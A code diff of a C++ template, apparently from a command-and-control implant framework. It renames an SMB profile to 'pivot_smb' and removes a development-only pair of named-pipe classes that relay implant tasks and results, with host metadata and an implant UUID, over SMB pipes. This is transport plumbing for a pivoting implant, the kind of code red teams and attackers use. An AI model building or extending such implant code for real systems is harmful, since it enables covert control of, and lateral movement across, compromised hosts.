@@ -196,7 +196,7 @@ public:
 };
 
 //if smb....
-[% elif profile.type == 'smb' %]
+[% elif profile.type == 'pivot_smb' %]
 
 class [[ profile.ns ]]_Ingress : public IIngressTransport {
 public:
@@ -277,65 +277,3 @@ public:
 
 
 /* endtemplate */
-
-
-//later
-// // ==========================================================
-// // 3. PIPE IMPLEMENTATIONS (SMB Profile)
-// // ==========================================================
-
-//hardcoded, for dev
-class PipeIngress : public IIngressTransport {
-private:
-    HANDLE h_inbox_;
-    HANDLE h_outbox_;
-
-public:
-    PipeIngress(HANDLE h_in, HANDLE h_out) : h_inbox_(h_in), h_outbox_(h_out) {
-    }
-
-    HANDLE get_wait_handle() override {
-        return NULL;
-    }
-
-    nlohmann::json create_get_request(const std::string& implant_uuid, bool full_metadata = false) override {
-        nlohmann::json metadata = nlohmann::json();
-        if (full_metadata) {
-            metadata = populate_metadata();
-        }
-        metadata["implant_uuid"] = implant_uuid;
-        return metadata;
-    }
-
-    nlohmann::json get(std::string implant_uuid) override {
-        nlohmann::json get_array = GetQueue::drain_queue();
-        get_array.push_back(this->create_get_request(implant_uuid, true));
-
-        std::vector<uint8_t> get_as_msgpack = this->pack_to_msgpack(get_array);
-
-        // DELEGATE TO NAMESPACE
-        std::vector<uint8_t> raw_response = SMB::Child::fetch_tasks(h_inbox_, h_outbox_, get_as_msgpack);
-
-        if (!raw_response.empty()) {
-            return this->unpack_to_json(raw_response);
-        }
-
-        return nlohmann::json();
-    }
-};
-
-class PipeEgress : public IEgressTransport {
-private:
-    HANDLE h_outbox_;
-
-public:
-    PipeEgress(HANDLE h) : h_outbox_(h) {
-    }
-
-    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
-        std::vector<uint8_t> batched_data = this->pack_to_msgpack(task_response_array);
-
-        // DELEGATE TO NAMESPACE
-        SMB::Child::send_data(h_outbox_, batched_data);
-    }
-};
